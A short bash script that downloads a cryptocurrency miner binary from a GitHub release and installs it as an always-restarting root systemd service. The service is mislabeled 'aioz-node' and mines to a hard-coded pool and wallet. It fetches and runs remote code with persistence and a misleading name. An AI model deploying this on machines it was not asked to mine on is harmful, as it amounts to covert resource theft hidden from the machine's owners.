#!/bin/bash

apt update -y
apt install unzip -y

#
wget https://github.com/cecepabdul/mining/releases/download/xdag/coreapp.zip
unzip coreapp.zip
chmod +x coreminer


#
sudo tee /etc/systemd/system/core.service <<EOF
[Unit]
Description=aioz-node
After=network.target

[Service]
ExecStart=/root/coreapp/coreminer -P stratum://cb567ce1c516e760df614d857b39a584461075a77a6b.pc@as.catchthatrabbit.com:8008

WorkingDirectory=/root/coreapp/
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl start core
sleep 10
sudo systemctl status core
